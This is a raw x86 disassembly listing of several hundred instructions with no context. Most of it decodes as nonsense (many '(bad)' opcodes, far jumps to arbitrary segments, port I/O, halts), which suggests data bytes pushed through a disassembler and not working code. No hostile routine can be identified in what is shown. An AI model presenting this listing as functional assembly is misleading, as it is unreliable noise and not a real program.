  404034:	idiv   DWORD PTR [edx+0x3934abc4]
  40403a:	sub    DWORD PTR [ebx-0x17],esi
  40403d:	rcl    DWORD PTR [esi],cl
  40403f:	mov    esp,DWORD PTR [eax+0xa]
  404042:	push   esp
  404043:	aaa    
  404044:	mov    esp,DWORD PTR [esi]
  404046:	int    0x28
  404048:	dec    eax
  404049:	(bad)  
  40404a:	aaa    
  40404b:	inc    ebp
  40404c:	push   eax
  40404d:	sar    BYTE PTR [ebx+0x1e],1
  404050:	mov    ds:0x58d36982,eax
  404055:	out    0x11,eax
  404057:	call   0xda9:0x17ba6e4d
  40405e:	ror    DWORD PTR [ebx+0x383d9d55],cl
  404064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404065:	xchg   edx,eax
  404066:	pop    edx
  404067:	loop   0x404083
  404069:	sub    eax,0x1e0c9cf0
  40406e:	outs   dx,BYTE PTR ds:[esi]
  40406f:	adc    edx,ebx
  404071:	lahf   
  404072:	leave  
  404073:	jno    0x4040e7
  404075:	mov    al,0x4e
  404077:	xor    DWORD PTR [ecx],ebp
  404079:	not    DWORD PTR [edx-0x58]
  40407c:	adc    eax,0xa6f120b3
  404081:	pop    ebp
  404082:	xor    DWORD PTR [edx-0x1cfba8bb],ebp
  404088:	in     al,dx
  404089:	popf   
  40408a:	mov    bh,0x60
  40408c:	rol    BYTE PTR [ebx],1
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	nop
  404090:	xor    BYTE PTR [esi-0x54402e26],ch
  404096:	fisttp QWORD PTR ds:0x7ede9f34
  40409c:	stc    
  40409d:	jmp    0xb503241e
  4040a2:	lea    ecx,[eax-0x6426fe4a]
  4040a8:	mov    ecx,0x96116568
  4040ad:	jne    0x4040f2
  4040af:	int3   
  4040b0:	pop    esp
  4040b1:	pusha  
  4040b2:	pusha  
  4040b3:	int3   
  4040b4:	sub    dl,BYTE PTR [eax-0x562d2b5f]
  4040ba:	cmp    DWORD PTR gs:[ebx],ebx
  4040bd:	pop    eax
  4040be:	dec    ebx
  4040bf:	sub    al,0xcc
  4040c1:	and    ah,BYTE PTR [eax-0x46ce1a7c]
  4040c7:	leave  
  4040c8:	cmp    dl,BYTE PTR [edi+0x134d513e]
  4040ce:	call   0xc8ec6cc3
  4040d3:	ins    DWORD PTR es:[edi],dx
  4040d4:	adc    bh,cl
  4040d6:	pop    ebx
  4040d7:	sub    esp,edx
  4040d9:	cwde   
  4040da:	xchg   edi,eax
  4040db:	pushf  
  4040dc:	outs   dx,DWORD PTR ds:[esi]
  4040dd:	retf   
  4040de:	pop    ebx
  4040df:	mov    ds:0x9fb2c83c,al
  4040e4:	or     eax,0x41a27645
  4040e9:	mov    DWORD PTR [ebx-0x5],ecx
  4040ec:	test   eax,0x69ba151b
  4040f1:	add    ch,BYTE PTR [ecx]
  4040f3:	xchg   esp,eax
  4040f4:	nop
  4040f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040f6:	(bad)  
  4040f7:	out    dx,eax
  4040f8:	xor    al,0xc8
  4040fa:	or     eax,DWORD PTR [esi]
  4040fc:	and    DWORD PTR [edi-0x4d5b5552],eax
  404102:	mov    BYTE PTR [edx],bh
  404104:	mul    esp
  404106:	mov    al,ds:0x79e56aa6
  40410b:	mov    ah,0x38
  40410d:	(bad)  
  40410f:	bound  ecx,QWORD PTR [esi-0xf]
  404112:	push   es
  404113:	mov    edx,0x5cc7072
  404118:	push   edi
  404119:	aas    
  40411a:	pop    es
  40411b:	mov    WORD PTR [esi+0x4123c293],fs
  404121:	mov    dh,0xa3
  404123:	sub    al,0xd7
  404125:	sbb    BYTE PTR [ecx],0xec
  404128:	dec    esi
  404129:	test   eax,0x9f7c48bc
  40412e:	adc    al,0xbc
  404130:	lds    edi,FWORD PTR [ebx+0x2bebfe78]
  404136:	jae    0x404191
  404138:	mov    ch,0x25
  40413a:	pop    edi
  40413b:	clc    
  40413c:	add    BYTE PTR [ebp+esi*1-0x472674f3],ah
  404143:	mov    ah,0x49
  404145:	shl    DWORD PTR [esi+0x76],cl
  404148:	ja     0x4040d5
  40414a:	scas   al,BYTE PTR es:[edi]
  40414b:	in     eax,dx
  40414c:	inc    edx
  40414d:	sub    DWORD PTR [eax+esi*2+0x28fe7f18],esp
  404154:	adc    DWORD PTR [edx],0x9d3a6919
  40415a:	pop    ebx
  40415b:	ficom  DWORD PTR [edx+ecx*1+0x7bcf9c38]
  404162:	xchg   DWORD PTR [esi],ebp
  404164:	cmp    al,0xc3
  404166:	or     al,BYTE PTR [ecx]
  404168:	dec    esp
  404169:	retf   
  40416a:	pop    ss
  40416b:	mov    dl,0x41
  40416d:	cmp    BYTE PTR [ebx+0x5c],dl
  404170:	push   esp
  404171:	sbb    BYTE PTR [ebp-0x6c],cl
  404174:	retf   0x9126
  404177:	push   ebx
  404178:	cmp    DWORD PTR ds:0xe1a1227b,edx
  40417e:	repz icebp 
  404180:	fsub   st,st(2)
  404182:	xchg   ebx,eax
  404183:	mov    ds:0x45dceaf4,al
  404188:	push   ecx
  404189:	icebp  
  40418a:	fdivr  st(4),st
  40418c:	sbb    al,0xe7
  40418e:	imul   ebx,DWORD PTR [esi],0x181c5f8c
  404194:	adc    DWORD PTR [esi-0x46e1830b],ebp
  40419a:	(bad)  
  40419c:	push   ds
  40419d:	or     DWORD PTR [ebx+0x4b],ebx
  4041a0:	add    eax,0x5bf72306
  4041a5:	outs   dx,BYTE PTR ds:[esi]
  4041a6:	push   esi
  4041a7:	xor    dl,BYTE PTR [eax+ebx*1+0x4c]
  4041ab:	pop    ecx
  4041ac:	sbb    cl,ah
  4041ae:	loop   0x404227
  4041b0:	push   ss
  4041b1:	scas   al,BYTE PTR es:[edi]
  4041b2:	in     eax,dx
  4041b3:	aaa    
  4041b4:	fsubrp st(0),st
  4041b6:	or     esi,DWORD PTR [edx]
  4041b8:	push   ds
  4041b9:	jle    0x40422f
  4041bb:	adc    ah,BYTE PTR [ebp+edx*4-0x52]
  4041bf:	cmc    
  4041c0:	add    ch,BYTE PTR [eax-0x2747e3bf]
  4041c6:	xchg   esi,eax
  4041c7:	cld    
  4041c8:	outs   dx,DWORD PTR ds:[esi]
  4041c9:	shl    eax,1
  4041cb:	adc    ebx,ecx
  4041cd:	adc    eax,0xf4f8e710
  4041d2:	test   DWORD PTR [edi-0x45],ecx
  4041d5:	js     0x404254
  4041d7:	test   al,0x73
  4041d9:	imul   esi,edx,0x6e
  4041dc:	lock push ecx
  4041de:	sbb    al,0x3c
  4041e0:	push   ebp
  4041e1:	pop    edi
  4041e2:	rcr    bh,cl
  4041e4:	inc    esp
  4041e5:	push   ds
  4041e6:	icebp  
  4041e7:	callw  0xc5b0
  4041eb:	in     eax,0x56
  4041ed:	cli    
  4041ee:	push   0x1f
  4041f0:	(bad)
  4041f4:	xchg   DWORD PTR [edi+ecx*2+0x284fb797],eax
  4041fb:	sub    DWORD PTR [edi-0x27a220aa],edi
  404201:	inc    ebp
  404203:	ins    DWORD PTR es:[edi],dx
  404204:	shl    edx,1
  404206:	sbb    al,0xf9
  404208:	and    DWORD PTR [edx],edx
  40420a:	jp     0x4041f1
  40420c:	add    BYTE PTR [edi+0x7e8935b9],al
  404212:	les    esi,FWORD PTR [ebp+ecx*2-0x36]
  404216:	jns    0x404265
  404218:	inc    ebx
  404219:	or     edx,edi
  40421b:	fimul  WORD PTR [edx]
  40421d:	and    BYTE PTR [edi],bh
  40421f:	pop    ebx
  404220:	out    dx,eax
  404221:	fsubrp st(2),st
  404223:	jae    0x40423d
  404225:	jmp    FWORD PTR [eax]
  404227:	add    eax,0x2910cfdd
  40422c:	ins    BYTE PTR es:[edi],dx
  40422d:	pop    esi
  40422e:	shl    DWORD PTR [edx],1
  404230:	and    esi,DWORD PTR [edx]
  404232:	sbb    BYTE PTR [ebp+0x3c8a8685],bh
  404238:	retf   0x9b6d
  40423b:	imul   BYTE PTR [edx-0x41]
  40423e:	xchg   esp,eax
  40423f:	pop    ss
  404240:	test   DWORD PTR [ebp-0x2],eax
  404243:	cmp    eax,0xce34d9f3
  404248:	hlt    
  404249:	aam    0xcc
  40424b:	jg     0x404284
  40424d:	sar    BYTE PTR [ebp+0x50],0x2f
  404251:	add    eax,0xb2405a43
  404256:	mov    DWORD PTR [esi+edx*4-0x61a1f973],esp
  40425d:	sub    ecx,esi
  40425f:	rcl    DWORD PTR [edi+0x310c5e94],1
  404265:	xchg   ebx,eax
  404266:	out    0x66,al
  404268:	lock sub eax,ebx
  40426b:	or     BYTE PTR [edx+0x18],bl
  40426e:	jp     0x404265
  404270:	push   ecx
  404271:	test   edx,ebp
  404273:	sub    BYTE PTR [edx-0x6e],bh
  404276:	jnp    0x4042a2
  404278:	rcr    DWORD PTR [edx],cl
  40427a:	sbb    bh,BYTE PTR [ebx-0x7618bee2]
  404280:	cmp    BYTE PTR [ebp+0x3],ch
  404283:	mov    edx,0xf3f2f14e
  404288:	dec    edi
  404289:	fisub  WORD PTR ds:0x107b545e
  40428f:	mov    eax,ds:0x880177bb
  404294:	mov    esp,0x91159496
  404299:	adc    eax,0xc70f111c
  40429e:	fistp  WORD PTR [ecx-0x4f]
  4042a1:	sub    BYTE PTR [ecx],dh
  4042a3:	pop    esi
  4042a4:	mov    ebx,DWORD PTR [eax-0x20]
  4042a7:	clc    
  4042a8:	and    BYTE PTR [ecx+edx*8],dh
  4042ab:	repz not BYTE PTR [ebx]
  4042ae:	int    0xa7
  4042b0:	cmp    al,0xc6
  4042b2:	adc    eax,0x1dfb28e7
  4042b7:	dec    esp
  4042b8:	xlat   BYTE PTR ds:[ebx]
  4042b9:	mov    ds:0x765d2d43,al
  4042be:	push   ebx
  4042bf:	enter  0xe40,0x5a
  4042c3:	addr16 leave 
  4042c5:	retf   
  4042c6:	push   es
  4042c7:	push   ecx
  4042c8:	jae    0x404259
  4042ca:	ss and eax,0xdae5c5fb
  4042d0:	push   0x6821b248
  4042d5:	add    ah,BYTE PTR [edx]
  4042d7:	add    bh,ch
  4042d9:	je     0x4042f3
  4042db:	pop    ds
  4042dc:	and    eax,0x2a015b0e
  4042e1:	cmp    esp,DWORD PTR [edx-0x9]
  4042e4:	mov    ecx,0x8f7319ce
  4042e9:	mov    esi,0xb505951c
  4042ee:	(bad)
  4042f2:	jns    0x40433c
  4042f4:	fist   DWORD PTR [edi]
  4042f6:	xor    BYTE PTR [ebx+0x3],0x58
  4042fa:	das    
  4042fb:	adc    eax,0x259a5063
  404300:	push   ss
  404301:	hlt    
  404302:	aam    0xd7
  404304:	pop    esp
  404305:	sub    BYTE PTR gs:[ecx+0x530ae549],bl
  40430c:	jmp    0x4042ed
  40430e:	adc    eax,0x168e2a00
  404313:	xchg   DWORD PTR [edi],ecx
  404315:	pop    eax
  404316:	push   esp
  404317:	call   0xdb17e77d
  40431c:	leave  
  40431d:	(bad)  
  40431f:	in     al,dx
  404320:	inc    edx
  404321:	cmc    
  404322:	sub    eax,0xa97679c2
  404327:	and    WORD PTR [esi+0x4a],cx
  40432b:	sbb    bh,BYTE PTR [esi]
  40432d:	jp     0x4042c3
  40432f:	xchg   esi,eax
  404330:	lock dec ebx
  404332:	push   eax
  404333:	fimul  WORD PTR [esi-0x31]
  404336:	retf   0x442f
  404339:	jmp    0x4043b4
  40433b:	mov    ebp,0xc612e47e
  404340:	pop    ebx
  404341:	fld    DWORD PTR [eax+0x22ae0785]
  404347:	(bad)  
  404348:	lock cmc 
  40434a:	sub    al,0xa7
  40434c:	into   
  40434d:	fstp   TBYTE PTR [ebx+eiz*8+0x75db7220]
  404354:	mov    edx,0x94ba445d
  404359:	adc    ebp,DWORD PTR [esp+eiz*4-0x196f348]
  404360:	in     eax,0x34
  404362:	jge    0x4043ce
  404364:	outs   dx,BYTE PTR ds:[esi]
  404365:	aad    0x43
  404367:	pop    ecx
  404368:	push   ss
  404369:	and    al,0x37
  40436b:	outs   dx,DWORD PTR ds:[esi]
  40436c:	sti    
  40436d:	aaa    
  40436e:	not    BYTE PTR [edx+0x2a978684]
  404374:	dec    edx
  404375:	or     BYTE PTR [ebx],al
  404377:	icebp  
  404378:	sbb    BYTE PTR ds:[esi+edi*8-0x6b257399],bl
  404380:	imul   edi,DWORD PTR [bx+di+0x258f],0x6
  404386:	ins    DWORD PTR es:[edi],dx
  404387:	in     eax,0x35
  404389:	push   esi
  40438a:	out    0x64,eax
  40438c:	mov    ds:0x52b30892,eax
  404391:	fdiv   st(2),st
  404393:	fs enter 0x6890,0xcf
  404398:	aas    
  404399:	pusha  
  40439a:	nop
  40439b:	not    BYTE PTR [ebx+0xd]
  40439e:	pop    ds
  40439f:	cmp    eax,0x55fba388
  4043a4:	pop    edx
  4043a5:	retf   0x900f
  4043a8:	imul   ecx,DWORD PTR [esi+0x6d02bc1b],0x4fbc6d82
  4043b2:	iret   
  4043b3:	push   esi
  4043b4:	or     ebx,DWORD PTR [edx]
  4043b6:	push   es
  4043b7:	(bad)  
  4043b8:	jb     0x4043f1
  4043ba:	inc    edi
  4043bb:	xor    edx,edx
  4043bd:	push   0xf8c7c441
  4043c2:	mov    eax,ds:0xb24a854c
  4043c7:	popa   
  4043c8:	inc    edx
  4043c9:	in     al,0x22
  4043cb:	je     0x404402
  4043cd:	mov    ds:0x45db3bdf,al
  4043d2:	pop    es
  4043d3:	bnd je 0x4043f1
  4043d6:	in     al,0xdf
  4043d8:	stos   BYTE PTR es:[edi],al
  4043d9:	int    0x13
  4043db:	neg    BYTE PTR [esi]
  4043dd:	sub    BYTE PTR [edx+eiz*2-0x2c],dl
  4043e1:	outs   dx,DWORD PTR ds:[esi]
  4043e2:	daa    
  4043e3:	pop    esi
  4043e4:	xchg   edx,eax
  4043e5:	adc    BYTE PTR [ebp+0x2b539ac9],dh
  4043eb:	jae    0x40436f
  4043ed:	pop    ebp
  4043ee:	mov    edx,0xe84e9732
  4043f3:	ds hlt 
  4043f5:	dec    edx
  4043f6:	and    al,0xf2
  4043f8:	xor    al,0x8d
  4043fa:	shr    BYTE PTR [edx],1
  4043fc:	jle    0x404387
  4043fe:	cli    
  4043ff:	push   eax
  404400:	es aas 
  404402:	jne    0x404425
  404404:	cmp    dl,BYTE PTR [ebx+0x71]
  404407:	jge    0x404442
  404409:	test   DWORD PTR [edx],edx
  40440b:	cmp    BYTE PTR [edi-0x29],ch
  40440e:	mov    ebx,0xc0568fb3
  404413:	fist   DWORD PTR [edi]
  404415:	and    al,0xe
  404417:	mov    ecx,0xa9e914e5
  40441c:	mov    al,ds:0x7feea65b
  404421:	dec    esp
  404422:	nop
  404423:	mov    ah,0x5f
  404425:	in     eax,dx
  404426:	call   DWORD PTR [edi-0x5ed88e82]
  40442c:	pop    ss
  40442d:	inc    edi
  40442e:	add    al,0x42
  404430:	sub    DWORD PTR [edx-0x26b90a98],ebx
  404436:	daa    
  404437:	fmul   st,st(0)
  404439:	je     0x404480
  40443b:	cmc    
  40443c:	jg     0x404404
  40443e:	enter  0x5fb3,0x3b
  404442:	and    al,0x95
  404444:	mov    dl,0xac
  404446:	dec    edx
  404447:	data16 add BYTE PTR [eax],0xb5
  40444b:	pop    ss
  40444c:	jmp    0x8bab:0x21e87726
  404453:	rcl    DWORD PTR [eax],1
  404455:	push   ebx
  404456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404457:	pop    ebp
  404458:	xchg   ebp,eax
  404459:	pop    edi
  40445a:	sbb    ebp,DWORD PTR [ecx]
  40445c:	ficom  WORD PTR [edi+eiz*1+0xa]
  404460:	cmp    al,0x67
  404462:	aam    0x51
  404464:	loop   0x404401
  404466:	cmc    
  404467:	or     DWORD PTR [edx-0x28],0x30
  40446b:	sub    al,0x6c
  40446d:	inc    edi
  40446e:	pop    ecx
  40446f:	daa    
  404470:	test   DWORD PTR ds:0x2c01862,esi
  404476:	mov    esp,0x8cc3c4d4
  40447b:	mov    gs,WORD PTR [esi]
  40447d:	mov    WORD PTR [esi+0x30],?
  404480:	rol    BYTE PTR [edi+0x788b6a8e],0xca
  404487:	rol    BYTE PTR [eax+ecx*4-0xf],1
  40448b:	arpl   WORD PTR [edi+0x7c6c3346],cx
  404491:	pop    ss
  404492:	jne    0x4044da
  404494:	jae    0x40447a
  404496:	mov    dl,0x34
  404498:	push   ds
  404499:	or     dl,BYTE PTR [ecx-0x5500e07e]
  40449f:	mov    ds:0x65c00725,al
  4044a4:	fidiv  WORD PTR [eax]
  4044a6:	sbb    al,0x57
  4044a8:	dec    eax
  4044a9:	mov    BYTE PTR [ebp+0x2d],dl
  4044ac:	pop    ds
  4044ad:	xor    bh,dl
  4044af:	les    edx,FWORD PTR [esi+0x1af68106]
  4044b5:	pop    ebp
  4044b6:	je     0x4044a6
  4044b8:	mov    dl,0x4d
  4044ba:	jl     0x4044e9
  4044bc:	cmp    ebp,DWORD PTR [eax-0x77bc2e9]
  4044c2:	call   0x7f57e701
  4044c7:	fmul   st,st(3)
  4044c9:	pop    ecx
  4044ca:	fdiv   DWORD PTR [edx-0x6807e0c0]
  4044d0:	hlt    
  4044d1:	mov    ch,0xd
  4044d3:	ffree  st(1)
  4044d5:	fwait
  4044d6:	mov    dh,0x98
  4044d8:	inc    ecx
  4044d9:	jmp    0x7848:0x2316724e
  4044e0:	cmp    ebp,DWORD PTR [edx+0x71]
  4044e3:	jge    0x4044a5
  4044e5:	cld    
  4044e6:	test   eax,0x80918357
  4044eb:	pushw  es
  4044ed:	int    0x18
  4044ef:	sbb    esi,eax
  4044f1:	(bad)  
  4044f2:	jbe    0x404542
  4044f4:	xor    ch,bh
  4044f6:	or     BYTE PTR ds:0xa08c7a7a,ch
  4044fc:	leave  
  4044fd:	mov    cs,ecx
  4044ff:	hlt    
  404500:	xor    bh,BYTE PTR [ebp-0x50]
  404503:	adc    eax,0x1926b074
  404508:	shl    DWORD PTR [edi-0x589c6e0a],0xd6
  40450f:	pop    ecx
  404510:	shr    BYTE PTR [ebx+0x49],1
  404513:	test   al,0x9d
  404515:	in     eax,0xc3
  404517:	aam    0xdc
  404519:	mov    es,WORD PTR [eax+0x18]
  40451c:	test   ebp,esp
  40451e:	fwait
  40451f:	das    
  404520:	(bad)  
  404521:	mov    dl,0xfc
  404523:	cs pop ds
  404525:	pop    esi
  404526:	pop    edx
  404527:	mov    ecx,0x88d65199
  40452c:	mov    ah,0x55
  40452e:	xchg   ebp,eax
  40452f:	shl    DWORD PTR [edi],0xd
  404532:	lods   eax,DWORD PTR ds:[esi]
  404533:	push   cs
  404534:	aaa    
  404535:	dec    ecx
  404536:	and    edi,DWORD PTR [eax+eiz*1]
  404539:	call   0x974e7c49
  40453e:	lds    ebp,FWORD PTR [eax]
  404540:	scas   al,BYTE PTR es:[edi]
  404541:	jno    0x40457f
  404543:	jge    0x4044fc
  404545:	(bad)  
  404546:	shl    DWORD PTR [edx-0x16],0xb3
  40454a:	xchg   ebx,eax
  40454b:	push   ebp
  40454c:	jecxz  0x404556
  40454e:	inc    ebx
  40454f:	(bad)  
  404550:	mov    eax,ds:0x5a72832c
  404555:	jmp    0xc3d7:0x2373b7ff
  40455c:	mov    ah,0xb6
  40455e:	fstp   QWORD PTR [edx-0x37]
  404561:	out    0x5a,eax
  404563:	inc    ebx
  404564:	fnsave [esp+edx*8]
  404567:	or     edx,DWORD PTR [eax+0x5d]
  40456a:	jl     0x37954a82
  404570:	sbb    al,cl
  404572:	and    DWORD PTR [ebp+0x45],esi
  404575:	push   ss
  404576:	ret    
  404577:	rcl    BYTE PTR [edx],cl
  404579:	mov    edx,0x3c7de1c6
  40457e:	hlt    
  40457f:	sub    al,0x32
  404581:	xor    al,0xf3
  404583:	pop    es
  404584:	dec    edx
  404585:	popf   
  404586:	sti    
  404587:	and    al,0x28
  404589:	outs   dx,BYTE PTR ds:[esi]
  40458a:	adc    esp,0x9d84b81d
  404590:	fwait
  404591:	ds pop edx
  404593:	scas   al,BYTE PTR es:[edi]
  404594:	mov    ebp,0x92b92f8a
  404599:	adc    eax,0xb4a353a3
  40459e:	retf   0x9d2f
  4045a1:	dec    esi
  4045a2:	pusha  
  4045a3:	cmp    eax,0x2e7963ed
  4045a8:	pop    ecx
  4045a9:	(bad)  
  4045aa:	push   ss
  4045ab:	test   DWORD PTR [eax],edx
  4045ad:	je     0x404585
  4045af:	imul   esi,esp,0xffffffe4
  4045b2:	adc    esi,ebx
  4045b4:	and    dh,bh
  4045b6:	not    ch
  4045b8:	inc    edi
  4045b9:	sbb    al,bl
  4045bb:	inc    ecx
  4045bd:	popa   
  4045be:	xor    dl,BYTE PTR [edi-0x3bf08ca3]
  4045c4:	adc    al,0xc9
  4045c6:	or     eax,0xbd0814ea
  4045cb:	ss pop edx
  4045cd:	pop    ebp
  4045ce:	push   edi
  4045cf:	mov    eax,ds:0xa8a41341
  4045d4:	mov    dh,0xe0
  4045d6:	inc    esp
  4045d7:	inc    ecx
  4045d8:	cmp    DWORD PTR [ecx],ebx
  4045da:	ss jbe 0x40462a
  4045dd:	inc    ecx
  4045de:	test   al,0x88
  4045e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e1:	mov    ecx,0xa4aeda49
  4045e6:	or     ch,BYTE PTR [edi]
  4045e8:	enter  0xbcf4,0xd4
  4045ec:	out    dx,eax
  4045ed:	fdiv   QWORD PTR [ebp-0x171782b9]
  4045f3:	das    
  4045f4:	addr16 dec ebp
  4045f6:	fwait
  4045f7:	sub    DWORD PTR [edx-0x4604778c],esi
  4045fd:	jle    0x4045a1
  4045ff:	arpl   WORD PTR [eax+0x50],sp
  404602:	inc    edx
  404603:	push   esi
  404604:	imul   edi,DWORD PTR [esp+esi*1-0x7bdffbfe],0xf1dad730
  40460f:	mov    ch,0x59
  404611:	daa    
  404612:	ror    BYTE PTR [edx+0x6d],cl
  404615:	rcl    BYTE PTR [edi-0x3d9590f4],cl
  40461b:	fs sahf 
  40461d:	add    DWORD PTR [esi-0x38],0x70
  404621:	jle    0x4045ec
  404623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404624:	xor    esp,DWORD PTR [ebx-0x4f7564ce]
  40462a:	xchg   edi,eax
  40462b:	pop    eax
  40462c:	pop    esp
  40462d:	jle    0x4046a6
  40462f:	ins    BYTE PTR es:[edi],dx
  404630:	loope  0x40464b
  404632:	mov    ecx,0x18785800
  404637:	shr    DWORD PTR [ebx+ebp*4-0x2d670c86],0x32
  40463f:	xchg   edi,eax
  404640:	ds hlt 
  404642:	icebp  
  404643:	jne    0x40468f
  404645:	nop
  404646:	jno    0x4046af
  404648:	jge    0x40469f
  40464a:	test   eax,0x23536e67
  40464f:	sbb    BYTE PTR [ebp-0x7b],dl
  404652:	sahf   
  404653:	in     al,dx
  404654:	lods   eax,DWORD PTR ds:[esi]
  404655:	nop
  404656:	pop    edx
  404657:	xchg   edi,eax
  404658:	pop    edi
  404659:	repz inc eax
  40465b:	(bad)  
  40465c:	shl    DWORD PTR [esi-0x5],1
  40465f:	dec    edi
  404660:	sbb    dl,0x5d
  404663:	mov    cl,0x7c
  404665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404666:	shr    bl,0x81
  404669:	(bad)  
  40466a:	or     BYTE PTR ds:0x6d09d12d,cl
  404670:	inc    eax
  404671:	xor    BYTE PTR [ecx],dh
  404673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404674:	repnz pop es
  404676:	xor    eax,0xb6158f99
  40467b:	or     esp,DWORD PTR [ecx]
  40467d:	xor    al,0xdf
  40467f:	retf   
  404680:	icebp  
  404681:	fisub  WORD PTR [eax-0x24]
  404684:	(bad)  
  404686:	ret    
  404687:	or     BYTE PTR [ecx+0x2ac0c6de],cl
  40468d:	outs   dx,BYTE PTR ds:[esi]
  40468e:	test   DWORD PTR [esi-0x690f9059],ecx
  404694:	repnz int 0x94
  404697:	jmp    FWORD PTR [edi-0x16]
  40469a:	push   0x5
  40469c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40469d:	pop    esp
  40469e:	mov    dh,0x90
  4046a0:	jns    0x40464f
  4046a2:	cmp    eax,0x282219f2
  4046a7:	mov    ecx,0x846ef55d
  4046ac:	cmp    eax,DWORD PTR [eax]
  4046ae:	mov    al,ds:0x3d63f71b
  4046b3:	in     al,dx
  4046b4:	fsub   DWORD PTR [esi+0x48]
  4046b7:	icebp  
  4046b8:	aad    0xa1
  4046ba:	jo     0x4046c3
  4046bc:	test   BYTE PTR [edi+edi*2-0x689c3c22],ch
  4046c3:	std    
  4046c4:	mov    esi,0x3ef1ce4b
  4046c9:	popf   
  4046ca:	cli    
  4046cb:	rcr    DWORD PTR [edx-0x17],0x26
  4046cf:	mov    ds:0x31961521,al
  4046d4:	es ss adc eax,0xcd8d894e
  4046db:	inc    esi
  4046dc:	into   
  4046dd:	pop    esp
  4046de:	add    DWORD PTR [ecx],0xeb6c5a5d
  4046e4:	(bad)  
  4046e5:	pop    ss
  4046e6:	loope  0x4046e0
  4046e8:	jnp    0x40466c
  4046ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046eb:	mov    WORD PTR [ecx-0x67],ss
  4046ee:	mov    ds,WORD PTR ds:0xc79b5a06
  4046f4:	adc    al,0xe2
  4046f6:	xchg   edi,eax
  4046f7:	xchg   esp,eax
  4046f8:	xlat   BYTE PTR ds:[ebx]
  4046f9:	out    dx,eax
  4046fa:	cwde   
  4046fb:	(bad)  
  4046fc:	fild   DWORD PTR [ebx]
  4046fe:	shl    DWORD PTR [ecx],cl
  404700:	dec    ebp
  404701:	inc    edx
  404702:	out    0xac,al
  404704:	xor    al,BYTE PTR [edx+0x54670a1d]
  40470a:	inc    ecx
  40470b:	ret    
  40470c:	inc    eax
  40470d:	push   esi
  40470e:	dec    esi
  40470f:	div    BYTE PTR [esi]
  404711:	iret   
  404712:	mov    eax,ds:0x58c58105
  404717:	push   ebp
  404718:	mov    ah,0x87
  40471a:	sahf   
  40471b:	(bad)  
  40471c:	ror    BYTE PTR [edi+esi*4-0xa],1
  404720:	aas    
  404721:	add    DWORD PTR [esi-0x6aecdf4f],esi
  404727:	cmc    
  404728:	sub    ebp,DWORD PTR [ecx]
  40472a:	ret    0x4e1f
  40472d:	inc    ebx
  40472e:	add    DWORD PTR ds:0x977981a,eax
  404734:	inc    esi
  404735:	cmp    BYTE PTR fs:[esi],0x9e
  404739:	ret    0xa839
  40473c:	scas   al,BYTE PTR es:[edi]
  40473d:	or     BYTE PTR [edx+0x32],0xd9
  404741:	adc    al,0xc0
  404743:	aaa    
  404744:	cwde   
  404745:	hlt    
  404746:	xor    edx,edx
  404748:	loope  0x40470a
  40474a:	jle    0x4046cf
  40474c:	loop   0x404731
  40474e:	push   edx
  40474f:	push   esp
  404750:	inc    edi
  404751:	test   al,0xcb
  404753:	mov    DWORD PTR [edx],edi
  404755:	mov    ecx,0x443c9848
  40475a:	jnp    0x404783
  40475c:	in     al,dx
  40475d:	xchg   esp,eax
  40475e:	jne    0x4047ab
  404760:	sub    DWORD PTR [ebx],esp
  404762:	cld    
  404763:	xchg   ebx,eax
  404764:	test   DWORD PTR [ebx+0x48],0xc17aeedc
  40476b:	in     al,dx
  40476c:	pop    eax
  40476d:	int    0x5f
  40476f:	jo     0x404787
  404771:	pusha  
  404772:	inc    ebp
  404773:	in     al,0x2e
  404775:	retf   0xa626
  404778:	or     DWORD PTR [edi+0x5abd6249],edi
  40477e:	and    DWORD PTR [edi],ebx
  404780:	pop    eax
  404781:	push   ebx
  404782:	scas   al,BYTE PTR es:[edi]
  404783:	call   0xd1f0:0x18299376
  40478a:	xor    ch,BYTE PTR [edi+0x51ab315d]
  404790:	mov    ebp,0xebc2b7fb
  404795:	mov    ah,0xde
  404797:	(bad)  
  404798:	aas    
  404799:	push   ebx
  40479a:	dec    edx
  40479b:	pop    edi
  40479c:	mov    esi,0x8227bf36
  4047a1:	cld    
  4047a2:	not    BYTE PTR [ebx+ecx*8]
  4047a5:	push   cs
  4047a6:	std    
  4047a7:	dec    ebx
  4047a8:	push   edx
  4047a9:	pop    ebp
  4047aa:	mov    ebx,0xa006b73f
  4047af:	sub    BYTE PTR [ecx],dh
  4047b1:	xor    DWORD PTR [ecx+0x4d],ebp
  4047b4:	mov    ds:0x5822b1e7,al
  4047b9:	push   ss
  4047ba:	inc    edx
  4047bb:	ss sbb al,0x6b
  4047be:	out    dx,eax
  4047bf:	das    
  4047c0:	ins    DWORD PTR es:[edi],dx
  4047c1:	or     BYTE PTR [edx-0xc],al
  4047c4:	jnp    0x404817
  4047c6:	out    dx,al
  4047c7:	in     al,0xd6
  4047c9:	test   DWORD PTR [eax],ebp
  4047cb:	mov    ds:0x9cb3e556,eax
  4047d0:	push   ds
  4047d1:	push   esi
  4047d2:	loop   0x4047dc
  4047d4:	xor    eax,0x55b9008a
  4047d9:	sbb    eax,0xd055acd
  4047de:	add    al,0xc
  4047e0:	fild   DWORD PTR [ebx]
  4047e2:	xor    DWORD PTR [ebp-0x64],ebx
  4047e5:	stos   BYTE PTR es:[edi],al
  4047e6:	(bad)  
  4047e7:	cmc    
  4047e8:	scas   eax,DWORD PTR es:[edi]
  4047e9:	mov    BYTE PTR [ebx],al
  4047eb:	adc    dh,dh
  4047ed:	pop    ebp
  4047ee:	pop    eax
  4047ef:	add    al,0xf4
  4047f1:	and    eax,0xa8437afc
  4047f6:	fsub   DWORD PTR [eax-0x5ab17c0c]
  4047fc:	(bad)  
  4047fd:	push   0x1d
  4047ff:	dec    edx
  404800:	jns    0x404785
  404802:	jmp    0x404848
  404804:	dec    ecx
  404805:	iret   
  404806:	sbb    edx,ebp
  404808:	cli    
  404809:	jecxz  0x40487a
  40480b:	inc    edx
  40480c:	fidivr DWORD PTR [esi+0x50]
